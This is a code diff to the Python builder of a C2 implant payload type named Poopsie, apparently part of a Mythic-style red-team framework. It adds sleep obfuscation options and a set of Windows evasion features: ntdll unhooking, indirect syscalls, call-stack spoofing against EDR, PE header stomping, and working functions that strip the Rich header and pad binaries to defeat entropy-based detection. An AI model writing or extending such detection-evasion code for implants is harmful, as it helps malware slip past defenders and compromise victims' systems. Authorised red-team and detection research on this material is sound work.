@@ -131,7 +131,7 @@ class Poopsie(PayloadType):
             parameter_type=BuildParameterType.ChooseOne,
             description="Sleep obfuscation technique (Windows x64 only)",
             default_value="none",
-            choices=["none", "ekko"],
+            choices=["none", "ekko", "foliage", "death_sleep"],
             group_name="Sleep Obfuscation Options",
             hide_conditions=[
                 HideCondition(name="architecture", operand=HideConditionOperand.NotEQ, value="x64")
@@ -234,6 +234,27 @@ class Poopsie(PayloadType):
             ],
             supported_os=["Windows"]
         ),
+        BuildParameter(
+            name="evasion",
+            parameter_type=BuildParameterType.ChooseMultiple,
+            description=(
+                "Evasion techniques to reduce binary signatures (Windows only). "
+                "nocrt: Remove CRT dependency (no msvcrt imports). "
+                "dfr: Dynamic Function Resolution via PEB walk. "
+                "iat_obf: Wipe import directory in memory. "
+                "stomp_pe: Zero PE headers in memory. "
+                "unhook_ntdll: Remap clean ntdll from disk. "
+                "indirect_syscalls: Use indirect syscall gadgets through ntdll (avoids syscall-from-non-ntdll detection). "
+                "stack_spoof: Spoof call stack frames before API calls (defeats EDR stack walking). "
+                "rich_header: Strip PE Rich header (removes compiler fingerprint). "
+                "entropy: Append English-text overlay to lower binary entropy (defeats ML entropy analysis)."
+            ),
+            default_value=[],
+            choices=["nocrt", "dfr", "iat_obf", "stomp_pe", "unhook_ntdll", "indirect_syscalls", "stack_spoof", "rich_header", "entropy"],
+            required=False,
+            group_name="Evasion Options",
+            supported_os=["Windows"],
+        ),
     ]
     
     c2_profiles = ["http", "websocket", "httpx", "dns", "tcp", "smb"]
@@ -303,7 +324,7 @@ class Poopsie(PayloadType):
             
             architecture = self.get_parameter("architecture")
             sleep_obfuscation = self.get_parameter("sleep_obfuscation")
-            if architecture == "x86" and sleep_obfuscation == "ekko":
+            if architecture == "x86" and sleep_obfuscation != "none":
                 c2_params["sleep_obfuscation"] = "none"
             else:
                 c2_params["sleep_obfuscation"] = sleep_obfuscation
@@ -414,6 +435,17 @@ class Poopsie(PayloadType):
                     resp.build_message += f"[strip] {strip_cmd} failed: {stderr.decode()}\n"
                     resp.status = BuildStatus.Error
                     return resp
+
+                # Post-compile evasion: Rich header stripping and entropy padding
+                evasion_options = self.get_parameter("evasion") or []
+                if selected_os == "Windows":
+                    if "rich_header" in evasion_options:
+                        if self.strip_rich_header(str(output_path)):
+                            resp.build_message += "Evasion: Rich header stripped\n"
+                    if "entropy" in evasion_options:
+                        self.add_entropy_padding(str(output_path))
+                        resp.build_message += "Evasion: Entropy padding added\n"
+
                 if payload_compression == "upx":
                     upx_cmd = f"/upx --best --lzma {output_path}"
                     proc = await asyncio.create_subprocess_shell(
@@ -468,6 +500,14 @@ class Poopsie(PayloadType):
                     resp.build_message += f"[strip DLL] {strip_cmd} failed: {stderr.decode()}\n"
                     resp.status = BuildStatus.Error
                     return resp
+
+                # Post-compile evasion on DLL before shellcode conversion
+                if "rich_header" in evasion_options:
+                    if self.strip_rich_header(str(dll_path)):
+                        resp.build_message += "Evasion: Rich header stripped from DLL\n"
+                if "entropy" in evasion_options:
+                    self.add_entropy_padding(str(dll_path))
+                    resp.build_message += "Evasion: Entropy padding added to DLL\n"
 
                 tool = self.get_parameter("tool")
                 command = ""
@@ -602,6 +642,10 @@ class Poopsie(PayloadType):
                 if architecture == "x64":
                     if self.get_parameter("sleep_obfuscation") == "ekko":
                         nim_args.append("-d:sleepObfuscationEkko")
+                    elif self.get_parameter("sleep_obfuscation") == "foliage":
+                        nim_args.append("-d:sleepObfuscationFoliage")
+                    elif self.get_parameter("sleep_obfuscation") == "death_sleep":
+                        nim_args.append("-d:sleepObfuscationDeathSleep")
 
             if use_openssl:
                 if selected_os == "Windows":
@@ -646,6 +690,20 @@ class Poopsie(PayloadType):
             build_messages.append(f"Commands: {len(selected_commands)} compiled")
             if selected_commands:
                 build_messages.append(f"Selected commands: {', '.join(sorted(selected_commands))}")
+            
+            # Evasion compile-time defines
+            evasion_options = self.get_parameter("evasion") or []
+            if selected_os == "Windows" and evasion_options:
+                for evasion in evasion_options:
+                    nim_args.append(f"-d:evasion_{evasion}")
+                build_messages.append(f"Evasion features: {', '.join(evasion_options)}")
+                if "nocrt" in evasion_options:
+                    nim_args.append("--passL:-nostartfiles")
+                    build_messages.append("  CRT removal: custom entry, no msvcrt startup")
+                if "stack_spoof" in evasion_options:
+                    # LTO is incompatible with inline asm used in stack spoofing
+                    nim_args = [a for a in nim_args if a not in ("--passC:-flto", "--passL:-flto")]
+                    build_messages.append("  LTO disabled (incompatible with stack spoof inline asm)")
             
             if selected_os == "Windows":
                 if architecture == "x64":
@@ -779,6 +837,74 @@ class Poopsie(PayloadType):
             return key_str.encode()
         else:
             return key_str.encode()
+
+    @staticmethod
+    def strip_rich_header(pe_path: str) -> bool:
+        """Strip the PE Rich header. The Rich header sits between the DOS stub
+        and the PE signature, identified by the 'Rich' marker (52 69 63 68).
+        We locate it, find its start via the 'DanS' marker, and zero out the region."""
+        try:
+            with open(pe_path, "r+b") as f:
+                data = bytearray(f.read())
+            rich_offset = data.find(b'Rich')
+            if rich_offset == -1:
+                return False
+            xor_key = data[rich_offset + 4:rich_offset + 8]
+            dans_plain = b'DanS'
+            dans_xored = bytes(a ^ b for a, b in zip(dans_plain, xor_key))
+            dans_offset = data.find(dans_xored)
+            if dans_offset == -1 or dans_offset >= rich_offset:
+                dans_offset = 0x80
+            end = rich_offset + 8
+            for i in range(dans_offset, end):
+                data[i] = 0
+            with open(pe_path, "wb") as f:
+                f.write(data)
+            return True
+        except Exception:
+            return False
+
+    @staticmethod
+    def add_entropy_padding(pe_path: str, target_kb: int = 64):
+        """Append low-entropy English-like text as a PE overlay to reduce 
+        the overall Shannon entropy of the binary."""
+        words = [
+            "the", "be", "to", "of", "and", "a", "in", "that", "have", "I",
+            "it", "for", "not", "on", "with", "he", "as", "you", "do", "at",
+            "this", "but", "his", "by", "from", "they", "we", "say", "her",
+            "she", "or", "an", "will", "my", "one", "all", "would", "there",
+            "their", "what", "so", "up", "out", "if", "about", "who", "get",
+            "which", "go", "me", "when", "make", "can", "like", "time", "no",
+            "just", "him", "know", "take", "people", "into", "year", "your",
+            "good", "some", "could", "them", "see", "other", "than", "then",
+            "now", "look", "only", "come", "its", "over", "think", "also",
+            "back", "after", "use", "two", "how", "our", "work", "first",
+            "well", "way", "even", "new", "want", "because", "any", "these",
+            "give", "day", "most", "us", "great", "between", "need", "large",
+            "under", "never", "each", "much", "begin", "those", "around",
+            "every", "still", "should", "help", "call", "world", "long",
+            "system", "program", "service", "start", "process", "application",
+            "function", "return", "value", "data", "information", "support",
+            "version", "number", "name", "file", "display", "output", "input",
+            "control", "change", "request", "response", "error", "message",
+        ]
+        import random
+        rng = random.Random(42)
+        pad_size = target_kb * 1024
+        padding = []
+        current_size = 0
+        while current_size < pad_size:
+            sentence_len = rng.randint(8, 20)
+            sentence = " ".join(rng.choice(words) for _ in range(sentence_len))
+            sentence = sentence.capitalize() + ".\r\n"
+            padding.append(sentence)
+            current_size += len(sentence)
+        pad_bytes = "".join(padding).encode("ascii")[:pad_size]
+        try:
+            with open(pe_path, "ab") as f:
+                f.write(pad_bytes)
+        except Exception:
+            pass
 
     def normalize_c2_config(self, config):
         """Normalize TOML-parsed config to match JSON structure expectations.
